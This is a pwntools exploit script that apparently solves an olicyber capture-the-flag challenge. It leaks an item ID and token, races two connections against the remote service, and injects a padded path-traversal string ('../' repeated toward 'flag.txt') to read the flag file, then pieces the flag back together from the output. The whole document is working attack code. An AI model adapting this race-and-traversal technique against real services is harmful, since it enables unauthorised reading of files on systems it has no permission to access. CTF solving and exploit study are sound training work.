from pwn import *

exe  = ELF("m3", checksec=True)

context.binary = exe

HOST = "mmm.challs.olicyber.it"
PORT = 16009

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def add_item(r):
    r.sendlineafter(b":", b"1")
    r.sendlineafter(b":", b"1")
    r.sendlineafter(b": ", b"a" * 0x20)

def leak_id_and_token(r):
    add_item(r)
    
    global ID
    r.recvuntil(b"ID: ")
    ID = r.recvline().decode().strip().encode()

    global TOKEN
    r.recvuntil(b"token: ")
    TOKEN = r.recvline().decode().strip().encode()

def overwrite_with_flag(r1, r2):
    r1.sendlineafter(b":", b"2")
    r1.sendlineafter(b":", ID)
    r1.sendlineafter(b":", TOKEN)

    r1.sendlineafter(b":", b"2")

    r2.sendlineafter(b":", b"2")
    r2.sendlineafter(b":", ID)

    r1.sendlineafter(b":", b"a" * 48 + b"../" * 8 + b"flag.txt")
    
    r1.sendlineafter(b":", b"3")
    r1.sendlineafter(b":", b"0")
    r1.sendlineafter(b":", b"0")

    r1.close()
    
    r2.sendlineafter(b":", TOKEN)
    r2.sendlineafter(b":", b"4")

def format_flag(r):
    r.recvuntil(b"selection: ")
    
    r.recvuntil(b"token: ")
    flag = r.recvline()[:-2]

    r.recvuntil(b"price: ")
    flag += bytes.fromhex(hex(int(r.recvline()[:-1]))[2:])[::-1]

    r.recvuntil(b"description: \n")
    flag += r.recvline()[3:-2]
    
    print(flag.decode())
    
def main():
    r1 = conn()
    r2 = conn()
    
    leak_id_and_token(r1)
    overwrite_with_flag(r1, r2)
    
    format_flag(r2)

if __name__ == "__main__":
    main()
